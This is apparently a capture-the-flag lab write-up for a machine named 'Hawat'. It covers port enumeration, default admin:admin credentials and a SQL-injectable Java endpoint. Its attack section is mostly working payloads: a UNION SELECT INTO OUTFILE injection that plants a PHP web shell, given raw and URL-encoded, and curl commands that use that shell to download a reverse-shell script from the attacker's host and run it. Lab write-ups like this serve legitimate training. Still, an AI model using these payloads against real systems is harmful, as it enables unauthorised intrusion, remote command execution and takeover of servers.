# Hawat

### Enumeration

```
17445/tcp open   unknown
...
30455/tcp open   http         nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
|_http-title: W3.CSS
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
|_http-title: W3.CSS Template
```

Weak credentials on 17445 and 50080 web services.

admin:admin

```
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.145.147
+ Target Port: 30455
...
+ GET /phpinfo.php: Output from the phpinfo() function was found.

Key point:
$_SERVER['DOCUMENT_ROOT'] = /srv/http
```

There is a file at 50080: issuetracker.zip

```
issuetracker.zip ---

@GetMapping("/issue/checkByPriority")
...
conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
System.out.println(query);
Statement stmt = conn.createStatement();
stmt.executeQuery(query);
...
```

**SQL Injection ->** priority parameter

### Access

```
Key payload:
"<?php system($_GET['cmd']);?>"

Main payload:
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/srv/http/cmd.php'; -- 

The SQL Query:
"SELECT message FROM issue WHERE priority='Normal' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/srv/http/cmd.php'; -- 

Request:
POST /issue/checkByPriority?priority=Normal' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/srv/http/cmd.php'; --

URL Encoded:
POST /issue/checkByPriority?priority=Normal'%20UNION%20SELECT%20%22%3c%3fphp%20system(%24_GET%5b'cmd'%5d)%3b%20%3f%3e%22%20INTO%20OUTFILE%20%22%2fsrv%2fhttp%2fcmd.php%22%3b%20--%20 HTTP/1.1
```

[https://www.revshells.com/](https://www.revshells.com) - Bash 196 - 443 port - Reverse Shell

```
$ curl 'http://192.168.145.147:30455/cmd.php?cmd=wget http://192.168.49.145:443/shell.sh'
$ curl 'http://192.168.145.147:30455/cmd.php?cmd=bash -p shell.sh'
```
